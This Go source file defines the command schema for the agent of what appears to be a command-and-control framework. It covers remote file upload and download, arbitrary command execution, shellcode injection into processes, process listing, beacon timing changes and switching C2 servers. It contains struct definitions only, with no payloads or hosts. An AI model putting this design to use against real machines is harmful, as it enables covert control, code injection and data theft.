package models

import "numinon_shadow/internal/agent/config"

// UploadFileArgs defines arguments for the "upload_file" command.
// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
type UploadFileArgs struct {
	TargetDirectory   string `json:"target_dir"`          // Absolute directory path on the agent's system
	TargetFilename    string `json:"target_filename"`     // Desired filename on the agent's system
	FileContentBase64 string `json:"file_content_base64"` // Base64 encoded content of the file
	ExpectedSha256    string `json:"expected_sha256"`     // SHA256 hash of the original (decoded) file content
	OverwriteIfExists bool   `json:"overwrite_if_exists"` // Flag to allow overwriting if file exists
}

// DownloadFileArgs defines arguments for the "download_file" command.
// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
type DownloadFileArgs struct {
	SourceFilePath string `json:"source_file_path"` // Absolute path of the file to download from the agent's system
}

// RunCommandArgs defines arguments for the "run_cmd" command.
// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
type RunCommandArgs struct {
	CommandLine string `json:"command_line"`    // The full command string to be executed
	Shell       string `json:"shell,omitempty"` // Optional: "cmd", "powershell", "sh", "bash". Agent default if empty.
	// TimeoutSeconds int `json:"timeout_seconds,omitempty"` // DEFERRED: Agent uses internal default for now
}

// ExecuteShellcodeArgs defines arguments for the "execute_shellcode" command.
// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
type ExecuteShellcodeArgs struct {
	ShellcodeBase64             string `json:"shellcode_base64"`                    // Base64 encoded shellcode (DLL or BIN)
	TargetPID                   uint32 `json:"target_pid,omitempty"`                // 0 or omitted for self-injection
	ArgumentsForShellcodeBase64 string `json:"args_for_shellcode_base64,omitempty"` // Optional args for the shellcode/export
	ExportName                  string `json:"export_name,omitempty"`               // Name of the function to call in the DLL (e.g., "LaunchCalc", "RunMe")
	// If empty, loader might default to DllMain or a pre-agreed export.
}

// EnumerateProcessesArgs defines arguments for the "enumerate_processes" command.
// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
type EnumerateProcessesArgs struct {
	ProcessName string `json:"process_name,omitempty"` // If empty, list all. Otherwise, filter by this name.
	// Add future flags here e.g., IncludePath *bool, IncludeOwner *bool
}

// ProcessInfo holds information about a single running process (part of EnumerateProcesses result).
// This struct is marshalled by the AGENT into TaskResult.Output.
type ProcessInfo struct {
	PID  uint32 `json:"pid"`  // Process ID
	Name string `json:"name"` // Executable name (e.g., "notepad.exe")
	// --- Future fields (commented out for initial implementation) ---
	// PPID        uint32 `json:"ppid,omitempty"`       // Parent Process ID
	// Path        string `json:"path,omitempty"`       // Full path to the executable
	// Owner       string `json:"owner,omitempty"`      // User account running the process
	// Arch        string `json:"arch,omitempty"`       // Architecture (e.g., "x86", "amd64")
	// SessionID   uint32 `json:"session_id,omitempty"` // Terminal Services session ID (Windows)
	// CommandLine string `json:"command_line,omitempty"`// Full command line
}

// MorphArgs defines parameters that can be dynamically updated in the agent.
// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
type MorphArgs struct {
	BaseSleep *string  `json:"base_sleep,omitempty"` // Duration string, e.g., "30s"
	Jitter    *float64 `json:"jitter,omitempty"`     // e.g., 0.0 to 1.0
	// CheckinMethod   *string  `json:"checkin_method,omitempty"` // "GET" or "POST"
	// EnablePadding   *bool    `json:"enable_padding,omitempty"` // DEFERRED
	// MinPaddingBytes *int     `json:"min_padding_bytes,omitempty"` // DEFERRED
	// MaxPaddingBytes *int     `json:"max_padding_bytes,omitempty"` // DEFERRED
	// ConnectionMode    *string  `json:"connection_mode,omitempty"` // DEFERRED
}

// HopArgs defines parameters for the agent to transition its C2 communication.
// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
type HopArgs struct {
	NewProtocol          config.AgentProtocol `json:"new_protocol"`
	NewServerIP          string               `json:"new_server_ip"`
	NewServerPort        string               `json:"new_server_port"`
	NewCheckInEndpoint   *string              `json:"new_check_in_endpoint,omitempty"`
	NewResultsEndpoint   *string              `json:"new_results_endpoint,omitempty"`
	NewWebSocketEndpoint *string              `json:"new_websocket_endpoint,omitempty"`
	NewDelay             *string              `json:"new_delay,omitempty"`
	NewJitter            *float64             `json:"new_jitter,omitempty"`
	NewBeaconMode        *bool                `json:"new_beacon_mode,omitempty"`
	NewCheckinMethod     *string              `json:"new_checkin_method,omitempty"`
	NewEnablePadding     *bool                `json:"new_enable_padding,omitempty"`
	NewMinPaddingBytes   *int                 `json:"new_min_padding_bytes,omitempty"`
	NewMaxPaddingBytes   *int                 `json:"new_max_padding_bytes,omitempty"`
	// No UUID since that will remain the same, Hop should not influence it
}
